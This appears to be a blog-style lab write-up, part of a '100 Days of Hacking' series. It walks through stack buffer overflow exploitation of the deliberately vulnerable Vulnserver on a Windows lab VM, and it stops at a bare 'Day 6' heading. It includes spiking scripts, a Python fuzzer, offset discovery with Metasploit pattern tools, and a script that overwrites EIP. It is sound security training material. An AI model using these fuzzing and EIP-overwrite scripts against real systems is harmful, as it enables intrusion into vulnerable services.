---
layout: default
title : muzec - 100 Days Of Hacking
---


####  `Day 1`

Buffer Overflow Attacks

Buffers are memory storage regions that temporarily hold data while it is being transferred from one location to another. A buffer overflow (or buffer overrun) occurs when the volume of data exceeds the storage capacity of the memory buffer like overloading it with datas to break it down.

`REQUIRED INSTALLATIONS TO SET UP The LAB`

Installations Of Windows 10 Enterprise, Immunity Debugger And Vulnserver On Vmware Player Resources can Be [Found Here For Downloads](https://github.com/fr334aks/100-days-of-Hacking/blob/main/Muzec/Resources.md)

![Image](https://imgur.com/hnUCH5Q.png)

Windows 10 running on Virtualbox Let Get Immunity Debugger and Vulnserver install on the Windows to get started....

![Image](https://imgur.com/VlsWFXM.png)

And we are ready to roll let extract the vulnserver and run it.

![Image](https://imgur.com/bT4cF4X.png)

Note i copy the window IP and the port 9999 is default in vulnserver and we are done with the set up......

`Anatomy Of The Stack`

When we look into the memory stack, we will find 4 main components:

1. Extended Stack Pointer (ESP)

2. Buffer Space

3. Extended Base Pointer (EBP)

4. Extended Instruction Pointer (EIP) / Return Address

![Image](https://imgur.com/3RnwFcW.png)

We really need to focus on the buffer space and the EIP. Buffer space is used as a storage area for memory in some coding languages. With proper input sanitation, information placed into the buffer space should never travel outside of the buffer space itself. Another way to think of this is that information placed into the buffer space should stop at the EBP.

![Image](https://imgur.com/RyAxTqu.png)

A number of A’s (x41) were sent to the buffer space, but were correctly sanitized. The A’s did not escape the buffer space and thus, no buffer overflow occurred. Now, let’s look at an example of a buffer overflow.

![Image](https://imgur.com/cAAxPg7.png)

Now, the A’s have completely escaped the buffer space and have actually reached the EIP. This is an example of a buffer overflow and how poor coding can become dangerous. If an attacker can gain control of the EIP, he or she can use the pointer to point to malicious code and gain a reverse shell.  which we are planning to do now.

####  `Day 2`

`SPIKING`

Spiking is done to figure out what is vulnerable in an application. We can use a tool called “generic_send_tcp” which is also present on kali linux to generate TCP connections with the vulnerable application.

![Image](https://imgur.com/gEu1Lin.png)

During spiking, in .spk script, we have to try all commands and check at which command the application crashes, in this case, it came out to be TRUN command and .spk script at which the application is crashing looks something like this.

STATS .spk script
```
s_readline();
s_string("STATS ");
s_string_variable("0");
```

TRUN .spk script

```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```
Ok let try it on the vulnserver we have on our windows 10 to figure out at exactly which command the application is crashing.

![Image](https://imgur.com/AvSkVzT.png)

Using The STATS.spk script we found nothing let try using the TRUN.spk script.

![Image](https://imgur.com/4INRd1D.png)

And it crashed with the “TRUN” command. Once we figure that out we are good to go ahead with that.

####  `Day 3`

`FUZZING`

Fuzzing allows us to send bytes of data to a vulnerable program (in our case, Vulnserver) in growing iterations, in hopes of overflowing the buffer space and overwriting the EIP. First, let’s write a simple Python fuzzing script on our Kali machine.

```
#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "TRUN /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('IP',9999))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
   ```
The code does the following:

1. Sets the variable “buffer” equal to 100 A’s.

2. Performs a while loop, sending each increasing iteration of A’s to Vulnserver and stopping when Vulnserver crashes.

Now let load up Vulnserver and Immunity Debugger as administrator (very important). In Immunity Debugger, click on File > Attach and select vulnserver.exe. Finally, let’s execute our script and see what happen to it boom.

![Image](https://imgur.com/xUwBdUG.png)

Now let check our vulnserver also.

![Image](https://imgur.com/VN8UUwl.png)

Crashed and what is my goals?? my goals is to find a way to control the EIP so i can point our malicious code to it so we can get a shell/root.

![Image](https://imgur.com/XiytejS.png)

This means that we have a buffer overflow vulnerability on our hands and we have proven that we can overwrite the EIP. At this point, we know that the EIP is located somewhere between 1 and 2700 bytes, but we are not sure where it’s located exactly. What we need to do next is figure out exactly where the EIP is located (in bytes) and attempt to control it.

Between the issue i face on Vulnserver is that at times Vulnserver will not crash, but Immunity will pause, which indicates a crash.  In this instance, you may 1) have to hit “Ctrl + C” to stop the fuzzing script and 2) not have all registers overwritten by “A”‘s.  This is okay as long as your program crashed and you have a general idea as to how many bytes were sent.

####  `Day 4`

`FINDING THE OFFSET`

Since we can overwrite the EIP and we know the overwrite occurred between 1 and 2400 bytes (let’s use 3,000 moving forward for a little extra padding), we can use a couple of Ruby tools called Pattern Create and Pattern Offset to find the exact location of the overwrite.

![Image](https://imgur.com/9Q75ffV.png)

Now let locate it on our kali machine.

![Image](https://imgur.com/WeBWczb.png)

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb`

Pattern Create allows us to generate a cyclical amount of bytes, based on the number of bytes we specify. We can then send those bytes to Vulnserver, instead of A’s, and try to find exactly where we overwrote the EIP. Pattern Offset will help us determine that soon.

![Image](https://imgur.com/a6H1TkB.png)

Now let modify our code like that below;

```
#!/usr/bin/python 
import sys, socket
 
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1"


try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.16.139.133',9999))
        s.send(('TRUN /.:/' + offset))
        s.close()

except:
        print "Error Connecting To Server" 
        sys.exit()
```
![Image](https://imgur.com/MYAd2av.png)

Cool we overwrite the program again everything appears as it did before, with Vulnserver crashing and our `TRUN` message appearing on the EAX register. Now, look at the EIP. The value is 386F4337 cool.

If we executed correctly, this value is actually part of our code that we generated with Pattern Create. Let’s try using Pattern Offset to find out.

Now let use the create_offset.rb `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb`

![Image](https://imgur.com/BWBMqld.png)

Cool we got exact match was found at 2003 bytes. This is really awesome lol i feel so cool We can now try to control the EIP, which will be critical later in our exploit.

####  `Day 5`

`OVERWRITING THE EIP`

Boom now that we know the EIP is after 2003 bytes cool let modify our code to confirm if we really have control over the EIP.

```
#!/usr/bin/python 
import sys, socket
 
shellcode = "A" * 2003 + "B" * 4


try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.16.139.133',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print "Error Connecting To Server" 
        sys.exit()
```

![Image](https://imgur.com/OmrprZB.png)

So, now the shellcode variable is back to a bunch of A’s and four B’s. What we are doing here is sending 2003 A’s in an attempt to reach, but not to overwrite the EIP. 

Then we are sending four B’s, which should overwrite the EIP with 42424242. Remember, the EIP has a length of four bytes, so if we overwrite successfully, we will be in full control and well on our way to root. Let’s execute the code and have a look

![Image](https://imgur.com/Au86j6a.png)


Boom our EIP have changed to 42424242 that confirm we have totally control over the EIP.

####  `Day 6`
